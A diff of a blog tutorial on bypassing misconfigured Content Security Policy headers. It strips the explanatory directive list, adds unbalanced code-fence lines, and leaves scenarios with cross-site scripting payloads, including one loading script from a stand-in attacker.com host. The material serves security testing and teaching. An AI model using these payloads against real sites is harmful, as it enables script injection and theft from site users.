@@ -28,34 +28,7 @@ Implemented via Response Header:
 Content-Security-policy: default-src 'self'; script-src 'self' allowed.com; img-src 'self' allowed.com; style-src 'self';
 Implemented via meta tag:
 
-<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
-Now you may have a question that what are default-src,img-src, style-src and script-src . These are directives of CSP. Using directives only content policy can be properly implemented. Below is the list of some common CSP directives:
 
-script-src : This directive specifies allowed sources for JavaScript. This includes not only URLs loaded directly into <script> elements, but also things like inline script event handlers (onclick) and XSLT stylesheets which can trigger script execution.
-default-src: This directive defines the policy for fetching resources by default. When fetch directives are absent in CSP header the browser follows this directive by default.
-Child-src: This directive defines allowed resources for web workers and embedded frame contents.
-connect-src: This directive restricts URLs to load using interfaces like <a>,fetch,websocket,XMLHttpRequest
-frame-src: This directive restricts URLs to which frames can be called out.
-frame-ancestors: This directive specifies the sources that can embed the current page. This directive applies to <frame>, <iframe>, <embed>, and <applet> tags. This directive can't be used in <meta> tags and applies only to non-HTML resources.
-img-src: It defines allowed sources to load images on the web page.
-Manifest-src: This directive defines allowed sources of application manifest files.
-media-src: It defines allowed sources from where media objects like <audio>,<video> and <track> can be loaded.
-object-src: It defines allowed sources for the <object>,<embed> and <applet> elements.
-base-uri: It defines allowed URLs which can be loaded using <base> element.
-form-action: This directive lists valid endpoints for submission from <form> tags.
-plugin-types: It defineslimits the kinds of mime types a page may invoke.
-upgrade-insecure-requests: This directive instructs browsers to rewrite URL schemes, changing HTTP to HTTPS. This directive can be useful for websites with large numbers of old URL's that need to be rewritten.
-sandbox: sandbox directive enables a sandbox for the requested resource similar to the <iframe> sandbox attribute. It applies restrictions to a page's actions including preventing popups, preventing the execution of plugins and scripts, and enforcing a same-origin policy.
-Sources: Sources are nothing but the defined directives values. Below are some common sources that are used to define the value of the above directives.
-
-   * : This allows any URL except data: blob: filesystem: schemes
-self : This source defines that loading of resources on the page is  allowed from the same domain.
-data: This source allows loading resources via the data scheme (eg Base64 encoded images)
-none: This directive allows nothing to be loaded from any source.
-unsafe-eval : This allows the use of eval() and similar methods for creating code from strings. This is not a safe practice to include this source in any directive. For the same reason it is named as unsafe. 
-unsafe-hashes: This allows to enable specific inline event handlers.
-unsafe-inline: This allows the use of inline resources, such as inline <script> elements, javascript: URLs, inline event handlers, and inline <style> elements. Again this is not recommended for security reasons.
-nonce: A whitelist for specific inline scripts using a cryptographic nonce (number used once). The server must generate a unique nonce value each time it transmits a policy.
 Let's take an example of a CSP in a webpage https://www.bhaveshthakur.com and see how it works:
 
 Content-Security-Policy: default-src 'self'; script-src https://bhaveshthakur.com; report-uri /Report-parsing-url;
@@ -90,14 +63,14 @@ Scenario : 2
 
 Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-eval' data: http://*; child-src 'none'; report-uri /Report-parsing-url;
 Again this is a misconfigured CSP policy due to usage of unsafe-eval.
-
+```
 working payload : 
 <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
 Scenario : 3
 
 Content-Security-Policy: script-src 'self' https://facebook.com https://google.com https: data *; child-src 'none'; report-uri /Report-parsing-url;
 Again this is a misconfigured CSP policy due to usage of a wildcard in script-src.
-
+```
 working payloads :
 "/>'><script src=https://attacker.com/evil.js></script>
 "/>'><script src=data:text/javascript,alert(1337)></script>
@@ -105,7 +78,7 @@ Scenario: 4
 
 Content-Security-Policy: script-src 'self' report-uri /Report-parsing-url;
 Misconfigured CSP policy again! we can see object-src and default-src are missing here.
-
+```
 working payloads :
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
 ">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
@@ -128,8 +101,9 @@ Scenario : 7
 
 Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com/; object-src 'none' ; report-uri /Report-parsing-url;
 In such scenarios where script-src is set to self and a javascript library domain which is whitelisted. It can be bypassed using any vulnerable version of javascript file from that library , which allows the attacker to perform xss.
-
+```
 working payloads :
+```
 <script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
  
 <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
@@ -165,10 +139,3 @@ working payloads :
 <iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
 * sometimes it can be achieved using defer& async attributes of script within iframe (most of the time in new browser due to SOP it fails but who knows when you are lucky?)
 <iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
-I hope you enjoyed reading this. Special thanks to @mikispag & @we1x for their contribution to Google Security research in the domain of Content Security Policy secure implementation.
-
-Thank You!
-
-For any feedback or suggestions reach out to me @Bhavesh_Thakur_
-
-
